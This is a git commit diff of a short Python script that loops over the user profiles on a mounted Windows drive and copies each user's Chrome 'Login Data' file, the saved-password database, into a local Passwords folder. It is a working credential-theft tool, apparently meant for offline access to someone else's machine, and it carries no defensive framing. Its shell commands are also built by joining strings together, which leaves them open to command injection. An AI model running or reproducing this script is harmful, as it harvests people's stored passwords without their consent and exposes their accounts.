760f256897f5767295f1fd9cd5a442562832504d
Adam Hassan <34610663+Adamkadaban@users.noreply.github.com>
2019-11-13 10:32:36 -0500

    Update script.py

--- script.py
+++ script.py
@@ -1,18 +1,21 @@
+WindowsUserDirectory="/media/root/OS/Users"
 prefix=""
+googleDirectory="" #default
+prefixFlag=False
 import os
-currDir=os.system('pwd')
-#os.system('ls >> users')
+currDir=os.popen('pwd').read().strip()
+os.system('ls '+WindowsUserDirectory+' >> '+currDir+'/users')
 fin=open('users')
 data=fin.readlines()
 usernames=[]
 for i in data:
-    if str(i)[:2]==prefix:
+    if str(i)[:2]==prefix and prefixFlag:
         usernames.append(i.strip())
 fin.close()
 
 #print(usernames)
 for i in usernames:
     try:
-        os.system("cp '/media/root/Windows/Users/"+i+"/AppData/Local/Google/Chrome/User Data/Default/Login Data' '/root/Desktop/Passwords/"+i+"'")
+        os.system("cp '"+WindowsUserDirectory+"/"+i+"/AppData/Local/Google/Chrome/User Data/Default/Login Data' '/root/Desktop/Passwords/"+i+"'")
     except:
         pass
